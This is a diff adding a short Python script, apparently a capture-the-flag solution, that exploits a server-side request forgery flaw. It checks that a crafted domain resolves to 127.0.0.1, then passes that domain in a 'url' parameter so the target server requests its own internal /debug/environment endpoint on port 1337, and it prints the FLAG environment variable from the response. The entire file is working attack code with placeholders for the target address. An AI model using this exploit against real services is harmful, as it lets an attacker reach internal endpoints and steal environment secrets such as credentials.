@@ -1,0 +1,64 @@
+import json
+import requests
+import socket
+import sys
+
+def check_dns(host_name):
+    try:
+        ip_addresses = socket.gethostbyname_ex(host_name)[-1]
+        for ip in ip_addresses:
+            print(f"resolved ip: {ip}")
+        
+        if '127.0.0.1' not in ip_addresses:
+            raise ValueError(f"Did not find 127.0.0.1 in: {ip_addresses}")
+    except Exception as e:
+        print(f"Error: {e}")
+        sys.exit(1)
+
+def exploit(vulnerable_url):
+    headers = {
+        "Accept": "*/*",
+        "Connection": "close",
+        "User-Agent": "MyCustomUserAgent"
+    }
+
+    try:
+        response = requests.get(vulnerable_url, headers=headers)
+        response.raise_for_status()
+
+        pr = response.json()
+        print(f"Flag: {pr['Environment variables']['FLAG']}")
+    except requests.HTTPError as e:
+        print(f"HTTP Error: {e}")
+    except json.JSONDecodeError as e:
+        print(f"JSON Decode Error: {e}")
+    except Exception as e:
+        print(f"Error: {e}")
+
+def main():
+    domain = "reddit.com2.golden2.store"
+    host = "your ip "
+    port = "your port"
+    vul_port = "1337"
+
+    exploit_domain = domain
+    server_host = host
+    server_port = port
+    vulnerable_port = vul_port
+
+    print(f"received flags: {exploit_domain}, {server_host}, {server_port}, {vulnerable_port}")
+
+    try:
+        check_dns(exploit_domain)
+        print("DNS resolves to 127.0.0.1. Running exploit")
+
+        server_endpoint = "/debug/environment"
+        vulnerable_url = f"http://{server_host}:{server_port}/?url={exploit_domain}:{vulnerable_port}{server_endpoint}"
+
+        print(f"vulnerable url built: {vulnerable_url}")
+        exploit(vulnerable_url)
+    except Exception as e:
+        print(f"Error: {e}")
+
+if __name__ == "__main__":
+    main()
